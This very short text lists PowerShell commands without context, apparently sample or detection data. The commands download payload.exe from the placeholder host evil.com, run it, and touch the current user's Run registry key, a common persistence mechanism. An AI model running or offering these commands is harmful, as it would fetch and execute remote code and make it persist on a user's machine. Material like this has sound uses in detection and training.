powershell.exe

Invoke-WebRequest https://evil.com/payload.exe

Start-Process payload.exe

New-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run

Set-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
